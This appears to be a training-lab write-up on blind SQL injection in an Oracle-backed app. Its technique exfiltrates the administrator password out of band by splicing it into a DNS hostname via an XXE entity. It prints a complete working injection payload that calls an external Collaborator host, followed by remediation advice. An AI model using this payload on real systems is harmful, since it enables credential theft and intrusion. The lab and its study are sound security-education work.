Once the database will talk to a host you control, the next question is how to put actual data inside the message. This lab is that step, and it is the previous injection with one clause added.

## The setup

Same `TrackingId` cookie, same Oracle backend, same asynchronous query that never touches the response. There is again a `users` table with `username` and `password`, and the goal is to recover the `administrator` password and log in.

Because nothing about the request changes based on the data, the password has to leave through the one channel I already have: an outbound lookup.

## How the vulnerability works

The external entity in the last lab pointed at a fixed URL. Nothing stops that URL from being built at query time. Oracle lets me concatenate the result of a subquery straight into the string that becomes the entity's `SYSTEM` target.

So instead of `http://COLLABORATOR-SUBDOMAIN/`, the URL becomes `http://<password>.COLLABORATOR-SUBDOMAIN/`. The DNS request for that hostname carries the secret in its own name, and Collaborator records the full name it was asked for.

There is no guessing here. One request, one interaction, and the value is sitting in the logs.

## Solving it

1. Get a fresh Collaborator subdomain from the Collaborator client, exactly as in the interaction lab.
2. Intercept the request and inject a payload that splices the password into the entity URL:

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

URL-encode it and send.

3. Go to the Collaborator tab and click "Poll now". If nothing shows, wait a few seconds and poll again. The query runs off the request path, so the interaction can arrive after the response.
4. Open the interaction. For a DNS hit the full looked-up name is in the description. For an HTTP hit it is in the `Host` header of the request to Collaborator.
5. Read the `administrator` password out of the subdomain and log in with it.

## Why that payload works

Everything from `XMLTYPE` down behaves as before: the external entity makes Oracle resolve the URL and the parse is the trigger. The new part is that the `SYSTEM` literal is no longer a constant. The `||` concatenations happen in SQL, so the query result is baked into the URL before the parser ever resolves it. The password rides out as part of the hostname because the hostname is the only piece of the request the attacker gets to choose.

## The fix

Parameterise the query so the cookie is data. Disable external entity resolution in the XML parser. Block the database host from making arbitrary outbound DNS and HTTP requests, which is what turns a read-only query into an exfiltration channel. Least privilege on the database user caps the damage when a query does leak.
